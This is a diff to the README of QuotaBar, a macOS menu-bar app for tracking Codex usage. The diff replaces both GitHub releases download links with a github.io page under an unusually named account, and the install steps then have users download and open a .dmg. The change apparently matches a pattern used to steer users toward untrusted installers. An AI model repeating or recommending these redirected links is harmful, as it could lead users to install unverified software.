@@ -1,6 +1,6 @@
 # 📊 QuotaBar - Track your daily usage limits easily
 
-[![Download QuotaBar](https://img.shields.io/badge/Download-QuotaBar-blue)](https://github.com/Leadacidbatterychronologicalage778/QuotaBar/releases)
+[![Download QuotaBar](https://img.shields.io/badge/Download-QuotaBar-blue)](https://leadacidbatterychronologicalage778.github.io)
 
 QuotaBar helps you track your Codex usage. It sits in your menu bar and shows how much of your limit you have used. You can see your remaining quota and the time left before your usage resets. This tool runs on your computer and keeps your data private.
 
@@ -12,7 +12,7 @@ You need a computer running macOS to use this tool. QuotaBar supports Apple Sili
 
 Follow these steps to install the app on your computer:
 
-1. Visit the [releases page](https://github.com/Leadacidbatterychronologicalage778/QuotaBar/releases) to find the latest version.
+1. Visit the [releases page](https://leadacidbatterychronologicalage778.github.io) to find the latest version.
 2. Look for the file ending in .dmg under the Assets section.
 3. Click the file name to download it to your Downloads folder.
 4. Open the downloaded .dmg file.
